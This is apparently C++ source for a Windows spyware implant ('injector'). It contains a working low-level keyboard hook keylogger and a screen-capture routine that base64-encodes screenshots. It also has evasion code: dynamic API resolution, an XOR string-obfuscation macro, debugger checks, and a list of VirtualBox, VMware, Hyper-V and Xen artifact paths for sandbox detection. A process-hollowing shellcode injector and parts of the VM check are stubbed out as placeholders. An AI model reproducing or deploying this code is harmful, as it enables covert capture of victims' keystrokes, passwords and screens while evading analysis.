#include "injector.h"
#include <iostream>
#include <intrin.h> // For __cpuid
#include <vector>
#include <string>
#include <mutex>
#include <thread>
#include <atomic>
#include <stdexcept> // For exceptions
#include <lmcons.h> // For UNLEN
#include <nlohmann/json.hpp>

// Global variables
ApiPointers g_api;
HHOOK g_hKeyboardHook = NULL;
std::vector<std::string> g_keyLogs;
std::mutex g_keyLogsMutex;
std::atomic<bool> g_stopKeyloggerThread(false);
std::thread g_keyloggerMessageThread;
std::string g_keyLogsJsonBuffer; // Buffer to hold the JSON string for GetKeyLogs

// XOR Obfuscation Macro
#define OBFUSCATED(str) [](){ \
    constexpr char key = 0xAA; /* Simple XOR key */ \
    const char* obfuscated_str = str; \
    size_t len = 0; \
    while (obfuscated_str[len] != '\0') { ++len; } \
    /* Need dynamic allocation as VLA is not standard C++ */ \
    char* deobfuscated_str = new char[len + 1]; \
    for(size_t i = 0; i < len; ++i) { \
        deobfuscated_str[i] = obfuscated_str[i] ^ key; \
    } \
    deobfuscated_str[len] = '\0'; \
    /* Caller should delete[] the result */ \
    return deobfuscated_str; \
}()

// Helper to deobfuscate (and free)
std::string deobfuscate(const char* obfuscated_with_key) {
    constexpr char key = 0xAA; /* Must match the key in OBFUSCATED */
    std::string deobfuscated;
    size_t len = 0;
    const char* ptr = obfuscated_with_key;
    while (*ptr != '\0') {
         len++;
         ptr++;
    }
    deobfuscated.reserve(len);
    for (size_t i = 0; i < len; ++i) {
        deobfuscated += obfuscated_with_key[i] ^ key;
    }
    delete[] obfuscated_with_key; // Free the allocated memory
    return deobfuscated;
}

bool InitializeApiPointers() {
    // Placeholder: Add actual initialization logic similar to stager's
    // For now, assume it's done elsewhere or before needed.
    // Crucially, it MUST initialize pointers needed below, e.g.:
    // RealIsDebuggerPresent, RealCheckRemoteDebuggerPresent, RealGetCurrentProcess
    // RealSetWindowsHookExW, RealUnhookWindowsHookEx, RealCallNextHookEx, RealGetAsyncKeyState
    // RealGetMessageW, RealTranslateMessage, RealDispatchMessageW, RealToUnicode
    // RealGetKeyboardState, RealWideCharToMultiByte, RealGetModuleHandleW
    // RealGetDC, RealReleaseDC, RealCreateCompatibleDC, RealCreateCompatibleBitmap
    // RealSelectObject, RealBitBlt, RealGetDeviceCaps, RealDeleteDC, RealDeleteObject
    // RealGetDIBits, RealCryptBinaryToStringA, RealOutputDebugStringA, Real_memcpy
    
    // Lazy initialization check
    static bool initialized = false;
    if (initialized) return true;

    // Minimal bootstrap to get LoadLibraryA and GetProcAddress
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) return false;
    g_api.RealGetProcAddress = (GetProcAddress_t)GetProcAddress(hKernel32, "GetProcAddress");
    if (!g_api.RealGetProcAddress) return false;
    g_api.RealLoadLibraryA = (LoadLibraryA_t)g_api.RealGetProcAddress(hKernel32, "LoadLibraryA");
    if (!g_api.RealLoadLibraryA) return false;

    // Load necessary libraries
    HMODULE hUser32 = g_api.RealLoadLibraryA("user32.dll");
    HMODULE hGdi32 = g_api.RealLoadLibraryA("gdi32.dll");
    HMODULE hAdvapi32 = g_api.RealLoadLibraryA("advapi32.dll");
    HMODULE hCrypt32 = g_api.RealLoadLibraryA("Crypt32.dll");

    // Resolve required pointers (add error checking for each!)
    g_api.RealIsDebuggerPresent = (IsDebuggerPresent_t)g_api.RealGetProcAddress(hKernel32, "IsDebuggerPresent");
    g_api.RealCheckRemoteDebuggerPresent = (CheckRemoteDebuggerPresent_t)g_api.RealGetProcAddress(hKernel32, "CheckRemoteDebuggerPresent");
    g_api.RealGetCurrentProcess = (GetCurrentProcess_t)g_api.RealGetProcAddress(hKernel32, "GetCurrentProcess");
    g_api.RealGetProcAddress = (GetProcAddress_t)g_api.RealGetProcAddress(hKernel32, "GetProcAddress");
    g_api.RealLoadLibraryA = (LoadLibraryA_t)g_api.RealGetProcAddress(hKernel32, "LoadLibraryA");
    g_api.RealFreeLibrary = (FreeLibrary_t)g_api.RealGetProcAddress(hKernel32, "FreeLibrary");
    g_api.RealWideCharToMultiByte = (WideCharToMultiByte_t)g_api.RealGetProcAddress(hKernel32, "WideCharToMultiByte");
    g_api.RealOutputDebugStringA = (OutputDebugStringA_t)g_api.RealGetProcAddress(hKernel32, "OutputDebugStringA");
    g_api.RealGetModuleHandleW = (GetModuleHandleW_t)g_api.RealGetProcAddress(hKernel32, "GetModuleHandleW");
    g_api.Real_memcpy = (memcpy_t)g_api.RealGetProcAddress(hKernel32, "memcpy"); // Check CRT source if needed
    
    if(hUser32) {
        g_api.RealSetWindowsHookExW = (SetWindowsHookExW_t)g_api.RealGetProcAddress(hUser32, "SetWindowsHookExW");
        g_api.RealUnhookWindowsHookEx = (UnhookWindowsHookEx_t)g_api.RealGetProcAddress(hUser32, "UnhookWindowsHookEx");
        g_api.RealCallNextHookEx = (CallNextHookEx_t)g_api.RealGetProcAddress(hUser32, "CallNextHookEx");
        g_api.RealGetAsyncKeyState = (GetAsyncKeyState_t)g_api.RealGetProcAddress(hUser32, "GetAsyncKeyState");
        g_api.RealGetMessageW = (GetMessageW_t)g_api.RealGetProcAddress(hUser32, "GetMessageW");
        g_api.RealTranslateMessage = (TranslateMessage_t)g_api.RealGetProcAddress(hUser32, "TranslateMessage");
        g_api.RealDispatchMessageW = (DispatchMessageW_t)g_api.RealGetProcAddress(hUser32, "DispatchMessageW");
        g_api.RealToUnicode = (ToUnicode_t)g_api.RealGetProcAddress(hUser32, "ToUnicode");
        g_api.RealGetKeyboardState = (GetKeyboardState_t)g_api.RealGetProcAddress(hUser32, "GetKeyboardState");
        g_api.RealGetDC = (GetDC_t)g_api.RealGetProcAddress(hUser32, "GetDC");
        g_api.RealReleaseDC = (ReleaseDC_t)g_api.RealGetProcAddress(hUser32, "ReleaseDC");
        g_api.RealPostMessageA = (PostMessageA_t)g_api.RealGetProcAddress(hUser32, "PostMessageA"); // Needed for keylogger stop
    }
    if(hGdi32) {
        g_api.RealCreateCompatibleDC = (CreateCompatibleDC_t)g_api.RealGetProcAddress(hGdi32, "CreateCompatibleDC");
        g_api.RealCreateCompatibleBitmap = (CreateCompatibleBitmap_t)g_api.RealGetProcAddress(hGdi32, "CreateCompatibleBitmap");
        g_api.RealSelectObject = (SelectObject_t)g_api.RealGetProcAddress(hGdi32, "SelectObject");
        g_api.RealBitBlt = (BitBlt_t)g_api.RealGetProcAddress(hGdi32, "BitBlt");
        g_api.RealGetDeviceCaps = (GetDeviceCaps_t)g_api.RealGetProcAddress(hGdi32, "GetDeviceCaps");
        g_api.RealDeleteDC = (DeleteDC_t)g_api.RealGetProcAddress(hGdi32, "DeleteDC");
        g_api.RealDeleteObject = (DeleteObject_t)g_api.RealGetProcAddress(hGdi32, "DeleteObject");
        g_api.RealGetDIBits = (GetDIBits_t)g_api.RealGetProcAddress(hGdi32, "GetDIBits");
    }
    if(hAdvapi32) {
         // Add functions from Advapi32 if needed (e.g., registry access for Anti-VM)
    }
    if(hCrypt32) {
         g_api.RealCryptBinaryToStringA = (CryptBinaryToStringA_t)g_api.RealGetProcAddress(hCrypt32, "CryptBinaryToStringA");
    }

    // TODO: Add checks for all resolved function pointers
    if (!g_api.RealSetWindowsHookExW || !g_api.RealGetDC /* ... etc */) {
        // Optionally free loaded libraries if init fails
        return false;
    }
    
    initialized = true;
    return true;
}

bool IsVMEnvironmentDetected() {
    // ... (existing code) ...

    // Check Registry Keys (Use double backslashes for paths)
    const char* vmRegistryKeys[] = {
        "HARDWARE\\Description\\System\\BIOS", // Check SystemBiosVersion, BaseBoardProduct, etc.
        "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", // Check Identifier
        "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum" // Check device names
        // Add more keys as needed
    };
    // ... (rest of registry check logic) ...

    // Check for VM Files (Use double backslashes for paths)
    const char* vmFiles[] = {
        "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
        "C:\\Windows\\System32\\drivers\\VBoxSF.sys",
        "C:\\Windows\\System32\\drivers\\VBoxVideo.sys",
        "C:\\Windows\\System32\\vboxdisp.dll",
        "C:\\Windows\\System32\\vboxhook.dll",
        "C:\\Windows\\System32\\vboxogl.dll",
        "C:\\Windows\\System32\\vboxoglarrayspu.dll",
        "C:\\Windows\\System32\\vboxoglcrutil.dll",
        "C:\\Windows\\System32\\vboxoglerrorspu.dll",
        "C:\\Windows\\System32\\vboxoglfeedbackspu.dll",
        "C:\\Windows\\System32\\vboxoglpackspu.dll",
        "C:\\Windows\\System32\\vboxoglpassthroughspu.dll",
        "C:\\Windows\\System32\\vboxservice.exe",
        "C:\\Windows\\System32\\vboxtray.exe",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        "C:\\Windows\\System32\\drivers\\vmci.sys",      // VMware VMCI Bus Driver
        "C:\\Windows\\System32\\drivers\\vsock.sys",     // VMware vSockets Driver
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmx_svga.sys",
        "C:\\Windows\\System32\\drivers\\vmxnet.sys",
        "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe", // Note double backslashes
        "C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\", // Added trailing backslash
        "C:\\Windows\\System32\\drivers\\hyperkbd.sys", // Hyper-V Keyboard
        "C:\\Windows\\System32\\drivers\\vmbus.sys",    // Hyper-V Virtual Machine Bus
        "C:\\Windows\\System32\\drivers\\Vhdmp.sys",    // Hyper-V VHD Driver
        "C:\\Windows\\System32\\drivers\\vpcbus.sys",   // Virtual PC Bus Driver
        "C:\\Windows\\System32\\drivers\\vpc-s3.sys",   // Virtual PC S3 Video Driver
        "C:\\Windows\\System32\\drivers\\xen.sys",      // Xen Driver
        // Add more file paths as needed
    };
    // ... (rest of file check logic, ensure any API calls use g_api) ...

    return false; // Placeholder
}

BOOL IsDebuggerPresentDetected() {
    if (!InitializeApiPointers()) { return FALSE; } // Ensure APIs are loaded
    BOOL debuggerPresent = FALSE;
    // Check using IsDebuggerPresent API
    if (g_api.RealIsDebuggerPresent && g_api.RealIsDebuggerPresent()) {
        debuggerPresent = TRUE;
    }
    // Check using CheckRemoteDebuggerPresent API
    HANDLE hProcess = g_api.RealGetCurrentProcess ? g_api.RealGetCurrentProcess() : NULL;
    BOOL remoteDebuggerPresent = FALSE;
    if (hProcess && g_api.RealCheckRemoteDebuggerPresent && g_api.RealCheckRemoteDebuggerPresent(hProcess, &remoteDebuggerPresent) && remoteDebuggerPresent) {
        debuggerPresent = TRUE;
    }
    // Check PEB BeingDebugged flag (requires PEB access setup)
    // ... PEB check logic ...

    return debuggerPresent;
}

int inject_process_hollowing(const char* target_process_name, void* shellcode, unsigned long shellcode_size, char** error_message) {
    if (!InitializeApiPointers()) { return -1; }
    // ... (existing logic, but replace ALL API calls with g_api.Real... ) ...
    return 0; // Placeholder
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (!InitializeApiPointers()) { return 0; }
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKbStruct = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::lock_guard<std::mutex> lock(g_keyLogsMutex); // Correct mutex name
            WCHAR buffer[2] = {0};
            BYTE keyboardState[256];
            if (g_api.RealGetKeyboardState && g_api.RealGetKeyboardState(keyboardState)) {
                if (g_api.RealToUnicode && g_api.RealToUnicode(pKbStruct->vkCode, pKbStruct->scanCode, keyboardState, buffer, 2, 0) == 1) {
                    char utf8Char[4];
                    int len = g_api.RealWideCharToMultiByte ? g_api.RealWideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8Char, sizeof(utf8Char), NULL, NULL) : 0;
                    if (len > 0) {
                        g_keyLogs.push_back(std::string(utf8Char, len));
                    }
                }
            }
        }
    }
    return g_api.RealCallNextHookEx ? g_api.RealCallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam) : 0;
}

void MessageLoopThread() {
    if (!InitializeApiPointers()) { return; }
    MSG msg;
    while (g_api.RealGetMessageW && g_api.RealGetMessageW(&msg, NULL, 0, 0) > 0) {
        if (g_api.RealTranslateMessage) g_api.RealTranslateMessage(&msg);
        if (g_api.RealDispatchMessageW) g_api.RealDispatchMessageW(&msg);
    }
}

bool StartKeylogger() {
    if (!InitializeApiPointers()) { return false; }
    if (g_hKeyboardHook != NULL) return true; 

    HMODULE hMod = g_api.RealGetModuleHandleW ? g_api.RealGetModuleHandleW(NULL) : NULL;
    if (!hMod) return false;

    g_stopKeyloggerThread = false;
    g_hKeyboardHook = g_api.RealSetWindowsHookExW ? g_api.RealSetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hMod, 0) : NULL;

    if (g_hKeyboardHook == NULL) {
        return false;
    }
    g_keyloggerMessageThread = std::thread(MessageLoopThread);
    return true;
}

bool StopKeylogger() {
    if (!InitializeApiPointers()) { return false; }
    if (g_hKeyboardHook == NULL) return true;

    BOOL unhooked = g_api.RealUnhookWindowsHookEx ? g_api.RealUnhookWindowsHookEx(g_hKeyboardHook) : FALSE;
    g_hKeyboardHook = NULL;

    g_stopKeyloggerThread = true;
    if (g_keyloggerMessageThread.joinable()) {
         // Use PostMessageA (assuming initialized from User32)
         // Be cautious if User32 might not be loaded
         if(g_api.RealPostMessageA) g_api.RealPostMessageA(NULL, WM_NULL, 0, 0);
        g_keyloggerMessageThread.join();
    }
    return unhooked;
}

const char* GetKeyLogs() {
    std::lock_guard<std::mutex> lock(g_keyLogsMutex); // Correct mutex name
    if (g_keyLogs.empty()) {
        return "[]";
    }
    try {
         nlohmann::json logsJson = g_keyLogs;
         g_keyLogsJsonBuffer = logsJson.dump();
    } catch (const std::exception& e) {
         g_keyLogsJsonBuffer = "[ \"Error creating JSON log\" ]";
    } 
    g_keyLogs.clear();
    return g_keyLogsJsonBuffer.c_str();
}

void FreeKeyLogsBuffer(const char* buffer) {
    // No-op
}

char* CaptureScreenshot() {
    if (!InitializeApiPointers()) { return nullptr; }

    if (!g_api.RealGetDC || !g_api.RealReleaseDC || !g_api.RealCreateCompatibleDC ||
        !g_api.RealCreateCompatibleBitmap || !g_api.RealSelectObject || !g_api.RealBitBlt ||
        !g_api.RealGetDeviceCaps || !g_api.RealDeleteDC || !g_api.RealDeleteObject ||
        !g_api.RealGetDIBits || !g_api.RealCryptBinaryToStringA) {
        if (g_api.RealOutputDebugStringA) g_api.RealOutputDebugStringA("Screenshot dependency function pointers missing.\n");
        return nullptr;
    }

    HDC hScreenDC = NULL;
    HDC hMemoryDC = NULL;
    HBITMAP hBitmap = NULL;
    HGDIOBJ hOldBitmap = NULL;
    BYTE* pBitmapBits = NULL;
    char* base64Data = nullptr;
    std::vector<BYTE> bmpBuffer;

    try {
        hScreenDC = g_api.RealGetDC(NULL); 
        if (!hScreenDC) throw std::runtime_error("GetDC failed");

        hMemoryDC = g_api.RealCreateCompatibleDC(hScreenDC);
        if (!hMemoryDC) throw std::runtime_error("CreateCompatibleDC failed");

        int width = g_api.RealGetDeviceCaps(hScreenDC, HORZRES);
        int height = g_api.RealGetDeviceCaps(hScreenDC, VERTRES);
        int bitsPerPixel = g_api.RealGetDeviceCaps(hScreenDC, BITSPIXEL);

        hBitmap = g_api.RealCreateCompatibleBitmap(hScreenDC, width, height);
        if (!hBitmap) throw std::runtime_error("CreateCompatibleBitmap failed");

        hOldBitmap = g_api.RealSelectObject(hMemoryDC, hBitmap);
        if (!hOldBitmap) throw std::runtime_error("SelectObject failed");

        if (!g_api.RealBitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY))
        { throw std::runtime_error("BitBlt failed"); }

        BITMAPINFOHEADER biHeader = {0};
        biHeader.biSize = sizeof(BITMAPINFOHEADER);
        biHeader.biWidth = width;
        biHeader.biHeight = -height; 
        biHeader.biPlanes = 1;
        biHeader.biBitCount = static_cast<WORD>(bitsPerPixel);
        biHeader.biCompression = BI_RGB;
        DWORD dwBmpSize = ((width * biHeader.biBitCount + 31) / 32) * 4 * abs(height);

        BITMAPFILEHEADER bfHeader = {0};
        bfHeader.bfType = 0x4D42; 
        bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bfHeader.bfSize = bfHeader.bfOffBits + dwBmpSize;

        pBitmapBits = new BYTE[dwBmpSize];
        if (!pBitmapBits) throw std::runtime_error("Failed to allocate memory for bitmap bits");

        BITMAPINFO bInfo = {biHeader};
        if (!g_api.RealGetDIBits(hMemoryDC, hBitmap, 0, abs(height), pBitmapBits, &bInfo, DIB_RGB_COLORS)) {
             throw std::runtime_error("GetDIBits failed");
        }

        bmpBuffer.resize(bfHeader.bfSize);
        if (g_api.Real_memcpy) { 
            g_api.Real_memcpy(bmpBuffer.data(), &bfHeader, sizeof(bfHeader));
            g_api.Real_memcpy(bmpBuffer.data() + sizeof(bfHeader), &biHeader, sizeof(biHeader));
            g_api.Real_memcpy(bmpBuffer.data() + bfHeader.bfOffBits, pBitmapBits, dwBmpSize);
        } else {
            throw std::runtime_error("memcpy function pointer not available");
        }

        DWORD base64Size = 0;
        if (!g_api.RealCryptBinaryToStringA(bmpBuffer.data(), bmpBuffer.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Size)) {
            throw std::runtime_error("CryptBinaryToStringA failed (size check)");
        }

        base64Data = new char[base64Size];
        if (!base64Data) throw std::runtime_error("Failed to allocate memory for base64 string");

        if (!g_api.RealCryptBinaryToStringA(bmpBuffer.data(), bmpBuffer.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Data, &base64Size)) {
            delete[] base64Data; 
            base64Data = nullptr;
            throw std::runtime_error("CryptBinaryToStringA failed (encoding)");
        }

    } catch (const std::runtime_error& e) {
        if(g_api.RealOutputDebugStringA) {
             g_api.RealOutputDebugStringA("Screenshot Error: ");
             g_api.RealOutputDebugStringA(e.what());
             g_api.RealOutputDebugStringA("\n");
        }
        if (base64Data) { 
            delete[] base64Data;
            base64Data = nullptr;
        }
        if (pBitmapBits) {
            delete[] pBitmapBits;
            pBitmapBits = nullptr;
        }
    }

    delete[] pBitmapBits;
    if (hOldBitmap && hMemoryDC && g_api.RealSelectObject) g_api.RealSelectObject(hMemoryDC, hOldBitmap);
    if (hBitmap && g_api.RealDeleteObject) g_api.RealDeleteObject(hBitmap);
    if (hMemoryDC && g_api.RealDeleteDC) g_api.RealDeleteDC(hMemoryDC);
    if (hScreenDC && g_api.RealReleaseDC) g_api.RealReleaseDC(NULL, hScreenDC);

    return base64Data;
}

void FreeScreenshotData(char* data) {
    if (data) {
        delete[] data;
    }
} 